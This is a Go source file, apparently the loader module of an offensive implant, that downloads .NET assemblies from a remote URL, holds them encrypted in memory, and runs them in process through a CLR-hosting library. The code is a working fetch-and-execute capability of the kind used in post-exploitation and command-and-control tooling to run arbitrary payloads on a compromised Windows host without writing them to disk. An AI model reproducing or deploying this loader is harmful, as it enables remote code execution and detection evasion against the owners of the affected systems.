package loader

import (
	"fmt"
	"io"
	"log"
	"logos/encryption"
	"net/http"
	"net/url"
	"path"

	clr "example.com/nothingtoseehere"
)

var assemblies map[string][]byte
var metahost *clr.ICLRMetaHost
var runtime string = "v4" // "v4" or "v2"

func Initialize() {
	metahost, _ = clr.GetICLRMetaHost()
	assemblies = make(map[string][]byte)
}

func DownloadAssembly(assembly_uri string) error {

	u, err := url.Parse(assembly_uri)

	if err != nil {
		return err
	}

	log.Printf("Downloading assembly from %s\n", u)
	resp, err := http.Get(u.String())

	if err != nil {
		return err
	}

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("invalid response from server [%d]", resp.StatusCode)
	}

	b, err := io.ReadAll(resp.Body)

	if err != nil {
		return err
	}

	assemblies[path.Base(u.Path)] = encryption.Encrypt(b)
	b = nil

	return nil
}

func ExecuteAssembly(assembly_name string, args ...string) {

	log.Printf("Executing assembly %s", assembly_name)
	a := args[1:] // remove assembly name

	log.Printf("[DEBUG] %s\n", assembly_name)

	for i, arg := range a {
		log.Printf("[DEBUG] arg %d->%s\n", i, arg)
	}

	if assemblies[assembly_name] == nil {
		log.Printf("[ERROR] assembly %s not found\n", assembly_name)
	} else {
		ret, err := clr.ExecuteByteArray(runtime, encryption.Decrypt(assemblies[assembly_name]), a)
		if err != nil {
			log.Printf("ret: %d, err: %s\n", ret, err)
		}
	}

}

func ListRuntimes() {
	runtimes, _ := clr.GetInstalledRuntimes(metahost)
	for r := range runtimes {
		fmt.Println(runtimes[r])
	}
}

func ListAssemblies() {
	for k := range assemblies {
		fmt.Printf("%s [%d bytes]\n", k, len(assemblies[k]))
	}
}

func IsRuntimeLoadable(runtime string) {
	info, err := clr.GetRuntimeInfo(metahost, runtime)
	if err == nil {
		var loadable bool
		info.IsLoadable(&loadable)
		fmt.Printf("loadable: %t\n", loadable)
	} else {
		fmt.Printf("err: %s\n", err)
	}
}

func CurrentRuntime() {
	fmt.Printf("Current runtime string is %s\n", runtime)
}

func SetCurrentRuntime(new_runtime string) {
	fmt.Printf("Setting current runtime string to %s\n", new_runtime)
	runtime = new_runtime
}
